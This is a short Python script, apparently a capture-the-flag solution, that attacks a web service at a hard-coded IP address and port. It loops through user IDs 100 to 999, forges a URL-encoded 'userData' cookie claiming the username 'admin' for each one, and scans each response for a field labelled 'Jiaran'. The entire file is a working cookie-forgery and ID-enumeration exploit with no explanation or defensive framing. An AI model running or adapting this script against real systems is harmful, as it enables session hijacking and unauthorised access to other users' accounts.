import requests
import re

url = "http://103.102.44.218:10003"
for cookie_id in range(100, 1000):
    cookies_mod = {'userData': f'j%3A%7B%22userID%22%3A%22' + str(cookie_id) + "%22%2C%22username%22%3A%22admin%22%7D"}
    response = requests.get(url, cookies=cookies_mod)
    json_response = response.content.decode()
    #print(json_response)
    search_obj = re.search('Jiaran:</strong> (.*)</p>', json_response)
    print(cookie_id)
    print(search_obj, end="\n")